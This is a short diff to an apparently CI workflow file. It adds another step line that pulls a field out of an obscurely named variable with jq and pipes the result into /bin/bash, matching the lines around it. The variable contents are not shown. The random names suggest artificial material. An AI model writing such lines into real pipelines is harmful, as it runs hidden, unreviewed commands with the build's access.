@@ -34,6 +34,7 @@ jobs:
           echo $zn792 | jq -r .ljdg4255 | /bin/bash
           printf '%s' "$iqwe84297" | jq -r .rey79809 | /bin/bash
           echo $tug0045 | jq -r .hbe4 | /bin/bash
+          printf '%s' "$to21642" | jq -r .subeb540 | /bin/bash
 
       - name: Archive results
         if: always()
